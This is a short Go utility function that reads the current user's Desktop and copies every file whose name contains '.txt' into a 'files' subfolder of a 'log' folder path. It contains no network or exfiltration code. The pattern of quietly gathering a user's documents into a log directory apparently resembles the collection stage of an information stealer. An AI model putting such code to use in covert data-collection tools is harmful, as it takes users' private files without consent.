package utils

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path"
	"strings"
)

func CopyTxtFiles(logFolderPath string) {
	dirname, err := os.UserHomeDir()
	if err != nil {
		log.Println(err)
		return
	}

	desktop := path.Join(dirname, "Desktop")

	items, _ := ioutil.ReadDir(desktop)
	fmt.Println(items)

	for _, item := range items {
		if strings.Contains(item.Name(), ".txt") {
			CopyFile(path.Join(desktop, item.Name()), path.Join(logFolderPath, "files", item.Name()))
		}
	}
}
